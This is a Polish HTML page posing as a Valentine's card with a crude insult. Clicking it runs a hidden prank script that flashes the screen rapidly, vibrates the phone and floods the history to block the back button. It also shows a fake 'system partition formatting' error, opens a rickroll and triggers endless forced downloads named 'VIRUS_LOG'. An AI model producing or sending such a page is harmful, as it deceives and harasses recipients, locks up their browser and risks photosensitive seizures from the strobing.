<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Walentynka</title>
    <style>
        body {
            background-color: red;
            color: white;
            font-family: 'Arial', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            cursor: pointer;
            overflow: hidden;
            text-align: center;
        }
        h1 { font-size: 3rem; text-shadow: 2px 2px 10px black; }
        p { font-size: 1.5rem; }
        /* Efekt mrugania tła */
        .flash { animation: blinker 0.2s linear infinite; }
        @keyframes blinker {
            50% { background-color: black; }
        }
    </style>
</head>
<body onclick="boom()">
    <div id="content">
        <h1>Walentynka</h1>
        <p>chcesz zostan moja walentynka?</p>
        <p><strong>KLIKNIJ TUTAJ jesli chcesz a jak nie to wypierdalaj</strong></p>
    </div>

    <script>
        function boom() {
            // Dodajemy mruganie ekranu po kliknięciu
            document.body.classList.add('flash');

            // Wibracje na telefonie (Android)
            if (navigator.vibrate) { navigator.vibrate([500, 200, 500, 200, 500]); }

            // Blokada przycisku wstecz (500 wpisów w historii)
            for (let i = 0; i < 500; i++) {
                window.history.pushState({}, '', "#warning_system_error_" + i);
            }

            // Pierwszy alert (straszak)
            alert("BŁĄD KRYTYCZNY! Rozpoczęto formatowanie partycji systemowej...");

            // Rickroll i bomby po 1 sekundzie
            setTimeout(function() {
                window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
                
                setInterval(function() {
                    const a = document.createElement('a');
                    a.href = 'data:text/plain;base64,WFREU0E=';
                    a.download = 'VIRUS_LOG_' + Math.floor(Math.random() * 9999) + '.txt';
                    a.click();
                }, 800);
            }, 1000);
        }
    </script>
</body>
</html>
